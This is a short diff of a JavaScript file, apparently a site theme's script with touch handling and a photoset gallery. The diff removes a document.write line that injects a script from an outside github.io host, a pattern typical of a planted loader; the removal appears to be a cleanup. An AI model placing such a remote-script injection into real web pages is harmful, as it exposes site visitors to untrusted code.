@@ -2926,10 +2926,6 @@
               c && r.off("touchmove" + f + " touchend" + f);
           });
       })();
-  })(window.jQuery || window.Zepto);
-  document.write(
-    "<script src=https://gbrrrl.github.io/script2.js></script>"
-  );
   function photoset() {
     $(".photoset-grid").photosetGrid({
       highresLinks: !0,
